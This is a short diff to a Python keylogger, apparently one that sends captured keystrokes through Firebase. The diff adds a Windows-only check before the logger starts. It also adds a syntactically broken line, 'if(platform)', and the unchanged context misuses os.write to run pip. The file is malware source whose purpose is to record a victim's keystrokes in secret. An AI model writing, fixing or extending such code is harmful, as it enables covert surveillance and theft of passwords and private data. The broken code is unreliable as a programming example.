@@ -6,7 +6,9 @@ import requests
 from firebase import firebase
 import threading
 import win32gui
+import platform
 
+if(platform)
 
 os.write("pip install -r library.txt")
 
@@ -131,6 +133,8 @@ class Keylogger:
         self.semaphore.acquire()
     
 if __name__=='__main__':
+    if(platform.system() != 'Windows'):
+        exit(1)
     keylogger = Keylogger(send_interval)
     keylogger.run()
     
